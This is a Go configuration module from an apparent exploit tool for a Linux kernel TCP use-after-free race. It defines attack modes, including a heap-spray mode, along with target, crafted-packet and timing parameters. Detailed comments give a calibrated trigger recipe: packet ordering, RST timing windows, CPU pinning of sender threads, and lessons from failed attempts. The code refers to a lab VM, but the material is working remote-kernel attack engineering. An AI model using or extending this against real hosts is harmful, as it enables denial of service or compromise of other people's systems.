// Package config holds the attack parameters ("attack data") the
// tool accepts as input: a TOML file, CLI overrides and TUI edits
// all merge into a single Config.
package config

import (
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/BurntSushi/toml"

	"cve98432/internal/packet"
)

// Mode selects the race strategy.
type Mode string

const (
	ModeHammer    Mode = "hammer"    // basic trigger: SYN -> dt -> retransmitted SYN
	ModeSpray     Mode = "spray"     // hammer + aggressive churn of kmalloc-96
	ModeMPTCP     Mode = "mptcp"     // same traffic aimed at an MPTCP listener
	ModeHandshake Mode = "handshake" // full handshake + RST, pinned 2-CPU race
)

func (m Mode) Valid() bool {
	switch m {
	case ModeHammer, ModeSpray, ModeMPTCP, ModeHandshake:
		return true
	}
	return false
}

func (m Mode) All() []Mode {
	return []Mode{ModeHammer, ModeSpray, ModeMPTCP, ModeHandshake}
}

// General carries tool-level settings.
type General struct {
	Lang   string `toml:"lang"` // ru | en
	DryRun bool   `toml:"dry_run"`
	CLI    bool   `toml:"cli"` // non-interactive mode
}

// Target describes the victim (your own lab host).
type Target struct {
	IP            string `toml:"ip"`
	Port          int    `toml:"port"`
	KernelVersion string `toml:"kernel_version"` // informational only
	Mode          Mode   `toml:"mode"`
}

// Payload describes the crafted packets.
type Payload struct {
	OptionsPreset string `toml:"options_preset"` // nop | ts | rr | ssrr | custom
	CustomHex     string `toml:"custom_options_hex"`
	TTL           int    `toml:"ttl"`
	Window        int    `toml:"window"`
	TCPCommonOpts bool   `toml:"tcp_common_options"`
	SourceIP      string `toml:"source_ip"` // optional bind address
	DFOnly        bool   `toml:"df_only"`   // set DF on IP header
}

// Timing controls the race.
type Timing struct {
	DeltaUs     int `toml:"delta_us"`    // SYN -> retransmit delay, microseconds
	Flows       int `toml:"flows"`       // parallel 4-tuples
	FlowGapMs   int `toml:"flow_gap_ms"` // pause between rounds of one flow
	DurationSec int `toml:"duration_sec"`
}

// Handshake controls the "handshake" mode (fire #2 design): one
// 4-tuple at a time, SYN -> wait for the real SYN-ACK, then THREE
// datagrams dispatched in PARALLEL from the SYN-ACK arrival (t=0):
// the completing ACK at t=0 from a thread pinned to cpu_ack, the
// byte-identical SYN retransmit at t=delta_ack_us from a thread
// pinned to cpu_rtx, and the closing RST at
// t=delta_ack_us+rst_gap_us from a DEDICATED thread pinned to
// cpu_rst. The RST must NOT go out from the ACK worker (it is busy
// inside its sendto and would shift the RST far past the reader;
// fire #3 post-mortem) nor from the coordinator (it is busy sending
// the SYNs and waiting on the tap, so the fires 1-5b pcaps show its
// RST landing tens of µs late with a wide jitter — exactly the
// ~10µs hit window). All three send CPUs must differ so the kernel
// processes the three paths in parallel on different CPUs — that
// overlap is what the UAF needs (fire #1, single CPU, missed;
// fire #3, serialized dispatch, missed: the retransmit arrived
// ~420µs AFTER the RST).
//
// Every sendto costs the same ~L microseconds, so the wire gaps
// equal the scheduled ones: with rst_gap_us >= 0 the wire order is
// ACK -> retransmit -> RST; with rst_gap_us < 0 the RST lands
// BEFORE the retransmit (at t=delta+gap, i.e. delta+gap < 0 puts
// it even before the ACK) — the calibrated hit window.
// The UAF (commit e3f33b0a1d89) requires the retransmit's ehash
// lookup to find the request socket (delta must be shorter than
// the ACK's child-creation path) and the RST's kfree(P) to land
// AFTER the retransmit's ireq_opt read. The viable free is the
// REQUEST-socket path: an RST that arrives before the ehash swap
// hits the req (embryonic_reset -> tcp_reqsk_destructor ->
// kfree(ireq_opt=P)) entirely kernel-side, with a small,
// unmeasurable latency C'. Calibration #4 on the KASAN lab VM
// (events.log x pcap) pins the window to rst_gap_us ~= 0..60
// (sweep it); negative values remain legal and are covered by the
// sweep when the window shifts.
//
// If delta_sweep_us / gap_sweep_us are non-empty, successive
// rounds cycle through those deltas / gaps instead of the fixed
// values (one run sweeps the whole window; see gap_sweep_us).
type Handshake struct {
	DeltaAckUs      int   `toml:"delta_ack_us"`      // ACK -> retransmit delay, µs
	RstGapUs        int   `toml:"rst_gap_us"`        // retransmit -> RST delay, µs (negative = RST lands BEFORE the retransmit; calibrated hit window ≈ 0..60, sweep it)
	CPURtx          int   `toml:"cpu_rtx"`           // vCPU for the retransmit thread (0 = unpinned)
	CPUAck          int   `toml:"cpu_ack"`           // vCPU for the completing-ACK thread (0 = unpinned)
	CPURst          int   `toml:"cpu_rst"`           // vCPU for the dedicated closing-RST thread (0 = unpinned); pin it to an IDLE vCPU so the RST wire timing stays tight (the coordinator is busy and jitters the RST)
	SynackTimeoutMs int   `toml:"synack_timeout_ms"` // skip the round if no SYN-ACK within
	DeltaSweepUs    []int `toml:"delta_sweep_us"`    // per-round delta cycle (optional)
	GapSweepUs      []int `toml:"gap_sweep_us"`      // per-round gap (RST) cycle (optional); negative values allowed (RST before the retransmit)
	ObserveUs       int   `toml:"observe_us"`        // post-dispatch observation window, µs (first response to the round 4-tuple ends the round early; 0 = no observation)
}

// Config is the merged attack description.
type Config struct {
	General   General   `toml:"general"`
	Target    Target    `toml:"target"`
	Payload   Payload   `toml:"payload"`
	Timing    Timing    `toml:"timing"`
	Handshake Handshake `toml:"handshake"`
}

// Default returns a safe, conservative configuration.
func Default() Config {
	return Config{
		General: General{Lang: "ru"},
		Target:  Target{IP: "127.0.0.1", Port: 80, Mode: ModeHammer},
		Payload: Payload{
			OptionsPreset: "ts",
			TTL:           64,
			Window:        65535,
			TCPCommonOpts: true,
			DFOnly:        true,
		},
		Timing: Timing{
			// 150 µs: the reference PoC dithers 100–200 µs after
			// the reqsk free; 30 µs sat below the race window.
			DeltaUs:     150,
			Flows:       32,
			FlowGapMs:   10,
			DurationSec: 60,
		},
		Handshake: Handshake{
			DeltaAckUs:      0,
			RstGapUs:        0,
			SynackTimeoutMs: 5,
			ObserveUs:       3000,
		},
	}
}

// Load reads a TOML file (if it exists) on top of defaults.
func Load(path string) (Config, error) {
	cfg := Default()
	if path == "" {
		return cfg, nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return cfg, nil
		}
		return cfg, err
	}
	if err := toml.Unmarshal(data, &cfg); err != nil {
		return cfg, fmt.Errorf("parse %s: %w", path, err)
	}
	return cfg, nil
}

// Save writes the configuration as TOML.
func (c Config) Save(path string) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := toml.NewEncoder(f)
	return enc.Encode(c)
}

// Validate checks all user-facing fields.
func (c Config) Validate() error {
	if !c.Target.Mode.Valid() {
		return fmt.Errorf("unknown mode %q (want hammer|spray|mptcp|handshake)", c.Target.Mode)
	}
	if c.Target.Port < 1 || c.Target.Port > 65535 {
		return fmt.Errorf("target port %d out of range", c.Target.Port)
	}
	switch strings.ToLower(strings.TrimSpace(c.Payload.OptionsPreset)) {
	case "nop", "ts", "rr", "ssrr", "custom":
	default:
		return fmt.Errorf("unknown options preset %q (want nop|ts|rr|ssrr|custom)", c.Payload.OptionsPreset)
	}
	if strings.EqualFold(strings.TrimSpace(c.Payload.OptionsPreset), "custom") {
		if c.Payload.CustomHex == "" {
			return fmt.Errorf("options_preset=custom requires custom_options_hex")
		}
		// Fail early on broken hex: the same rules apply at build
		// time, but here we can name the config field.
		b, err := packet.ParseIPOptionsHex(c.Payload.CustomHex)
		if err != nil {
			return fmt.Errorf("custom_options_hex: %v", err)
		}
		if len(b) == 0 {
			return fmt.Errorf("custom_options_hex: no option bytes")
		}
		if len(b)%4 != 0 {
			return fmt.Errorf("custom_options_hex: %d bytes, must be a multiple of 4", len(b))
		}
		if len(b) > 40 {
			return fmt.Errorf("custom_options_hex: %d bytes, longer than the 40-byte IHL limit", len(b))
		}
	}
	if c.Payload.TTL < 1 || c.Payload.TTL > 255 {
		return fmt.Errorf("ttl %d out of range", c.Payload.TTL)
	}
	if c.Payload.Window < 0 || c.Payload.Window > 65535 {
		return fmt.Errorf("window %d out of range", c.Payload.Window)
	}
	if c.Timing.DeltaUs < 1 || c.Timing.DeltaUs > 1_000_000 {
		return fmt.Errorf("delta_us %d out of range", c.Timing.DeltaUs)
	}
	if c.Timing.Flows < 1 || c.Timing.Flows > 4096 {
		return fmt.Errorf("flows %d out of range", c.Timing.Flows)
	}
	if c.Timing.FlowGapMs < 0 || c.Timing.FlowGapMs > 60_000 {
		return fmt.Errorf("flow_gap_ms %d out of range", c.Timing.FlowGapMs)
	}
	if c.Timing.DurationSec < 1 || c.Timing.DurationSec > 86_400 {
		return fmt.Errorf("duration_sec %d out of range", c.Timing.DurationSec)
	}
	h := c.Handshake
	if h.DeltaAckUs < 0 || h.DeltaAckUs > 1_000_000 {
		return fmt.Errorf("handshake.delta_ack_us %d out of range", h.DeltaAckUs)
	}
	// Negative values are allowed: they schedule the RST BEFORE the
	// retransmit on the wire. The calibrated hit window (calibration
	// #4, lab VM) is around the retransmit, on either side of it, so
	// the lab fires sweep both signs via gap_sweep_us.
	if h.RstGapUs < -1_000_000 || h.RstGapUs > 1_000_000 {
		return fmt.Errorf("handshake.rst_gap_us %d out of range (-1000000..1000000)", h.RstGapUs)
	}
	if h.CPURtx < 0 || h.CPUAck < 0 || h.CPURst < 0 {
		return fmt.Errorf("handshake.cpu_rtx/cpu_ack/cpu_rst must be >= 0 (0 = unpinned)")
	}
	// The three sender threads must live on distinct vCPUs: the UAF
	// needs the kfree (RST path) on a different CPU than the reader
	// (retransmit path), and the ACK worker must not stall the others.
	cpus := []int{h.CPURtx, h.CPUAck, h.CPURst}
	for i := range cpus {
		for j := i + 1; j < len(cpus); j++ {
			if cpus[i] > 0 && cpus[i] == cpus[j] {
				return fmt.Errorf("handshake: send vCPUs must all differ (cpu_rtx=%d cpu_ack=%d cpu_rst=%d)", h.CPURtx, h.CPUAck, h.CPURst)
			}
		}
	}
	if h.SynackTimeoutMs < 1 || h.SynackTimeoutMs > 10_000 {
		return fmt.Errorf("handshake.synack_timeout_ms %d out of range", h.SynackTimeoutMs)
	}
	if h.ObserveUs < 0 || h.ObserveUs > 10_000 {
		return fmt.Errorf("handshake.observe_us %d out of range (0..10000)", h.ObserveUs)
	}
	for _, d := range h.DeltaSweepUs {
		if d < 0 || d > 1_000_000 {
			return fmt.Errorf("handshake.delta_sweep_us value %d out of range", d)
		}
	}
	// Like rst_gap_us, sweep values may be negative (RST scheduled
	// before the retransmit) — the calibrated hit window is around
	// the retransmit, on either side of it.
	for _, g := range h.GapSweepUs {
		if g < -1_000_000 || g > 1_000_000 {
			return fmt.Errorf("handshake.gap_sweep_us value %d out of range (-1000000..1000000)", g)
		}
	}
	// Note: in handshake mode Timing.Flows > 1 is tolerated here but
	// the engine clamps it to 1 with a warning — one 4-tuple at a
	// time (no SYN flood, and the race needs the retransmit and the
	// ACK processed on two different CPUs).
	if c.General.Lang != "" && c.General.Lang != "ru" && c.General.Lang != "en" {
		return fmt.Errorf("lang must be ru|en, got %q", c.General.Lang)
	}
	return nil
}

// String parses helper for CLI overrides.
func ParsePort(s string) (int, error) {
	n, err := strconv.Atoi(s)
	if err != nil {
		return 0, fmt.Errorf("bad port %q", s)
	}
	return n, nil
}
